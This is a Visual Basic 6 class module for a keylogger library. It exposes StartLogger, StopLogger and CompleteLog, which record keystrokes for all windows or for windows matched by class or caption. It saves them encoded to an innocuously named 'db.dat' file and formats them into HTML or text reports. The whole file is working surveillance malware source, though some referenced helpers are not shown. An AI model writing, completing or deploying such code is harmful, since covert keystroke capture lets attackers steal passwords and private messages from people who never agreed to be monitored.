VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = True
Enum KeyLoggerMode
    LogEveryWindow = 0
    LogByClassName
    LogByWindowText
End Enum

Public Function StartLogger(Mode As KeyLoggerMode, Optional LogPath As String, Optional ClassName As String, Optional WindowText As String, Optional ExactMatch As Boolean = True, Optional ScanChildClasses As Boolean = False) As Boolean
    On Error Resume Next
    
    Dim tmpBuffer As String
    
    'If Len(LogPath) <= 0 Then LogPath = App.Path & "\Log For " & Format(Now, "DD MMM, YYYY") & ".txt"
    If Len(LogPath) <= 0 Then LogPath = App.Path & "\db.dat"
    
    
    
    Open LogPath For Binary As #1
        tmpBuffer = String(LOF(1), Chr(0))
        Get #1, , tmpBuffer
    Close #1
    Kill LogPath
    
    FileNumber = FreeFile
    Open LogPath For Binary As FileNumber
        Put FileNumber, , tmpBuffer
        tmpBuffer = ""
    bExactMatch = ExactMatch
    bScanChildClasses = ScanChildClasses
    ExpectedWindowText = WindowText
    ExpectedClass = ClassName
    LogMode = Mode
    frmControls.tmrChecker.Enabled = True
    
End Function

Public Function StopLogger()
    frmControls.tmrChecker.Enabled = False
    Close FileNumber
End Function

Public Function GetLastLog() As String
    GetLastLog = sBuf
End Function

Public Function CompleteLog(Optional AsHTML As Boolean = True) As String
    Dim sTmp As String
    Dim db As LogDB
    Dim nCtr As Integer
    
    Seek FileNumber, 1
    
    
    While Not EOF(FileNumber)
        Get FileNumber, , db
        If Not Len(db.Data) <= 0 Then
        nCtr = nCtr + 1
        If AsHTML = True Then
            sTmp = sTmp & "<b>Log Number: " & nCtr & "</b><center><TABLE BGCOLOR=DARKBLUE>"
            sTmp = sTmp & "<TR BGCOLOR=BLUE><TD><FONT COLOR=WHITE>Date:</FONT></TD><TD><FONT COLOR=WHITE>" & db.TimeStamp & "</FONT></TD></TR>"
            sTmp = sTmp & "<TR BGCOLOR=WHITE><TD><FONT COLOR=BLUE>Class:</FONT></TD><TD><FONT COLOR=BLUE>" & db.ClassName & "</FONT></TD></TR>"
            sTmp = sTmp & "<TR BGCOLOR=BLUE><TD><FONT COLOR=WHITE>Handle:</FONT></TD><TD><FONT COLOR=WHITE>" & db.Handle & "</FONT></TD></TR>"
            sTmp = sTmp & "<TR BGCOLOR=WHITE><TD><FONT COLOR=BLUE>Window Caption:</FONT></TD><TD><FONT COLOR=BLUE>" & db.WindowsText & "</FONT></TD></TR>"
            sTmp = sTmp & "<TR BGCOLOR=BLUE><TD><FONT COLOR=WHITE>Data:</FONT></TD><TD><FONT COLOR=WHITE>" & Dec(db.Data) & "</FONT></TD></TR>"
            sTmp = sTmp & "<TR BGCOLOR=WHITE><TD><FONT COLOR=BLUE>Transformed Data:</FONT></TD><TD><FONT COLOR=BLUE>" & Transform(Dec(db.Data)) & "</FONT></TD></TR>"
            sTmp = sTmp & "</TABLE></center><hr>"
        Else
            sTmp = sTmp & "Log Number: " & nCtr & vbCrLf
            sTmp = sTmp & "Date: " & db.TimeStamp & vbCrLf
            sTmp = sTmp & "Class: " & db.ClassName & vbCrLf
            sTmp = sTmp & "Handle: " & db.Handle & vbCrLf
            sTmp = sTmp & "Window Caption: " & db.WindowsText & vbCrLf
            sTmp = sTmp & "Data: " & Dec(db.Data) & vbCrLf
            sTmp = sTmp & "Transformed Data: " & Transform(Dec(db.Data)) & vbCrLf & vbCrLf
        End If
        End If
    Wend
    CompleteLog = sTmp & "<b>Total Log(s) Displayed: " & nCtr & "</b>"
    
End Function

Public Function GetDataBase() As String
    Dim sTmp As String
    
    Seek FileNumber, 1
    sTmp = String(LOF(FileNumber), Chr(0))
    Get FileNumber, , sTmp
    GetDataBase = sTmp
    
End Function

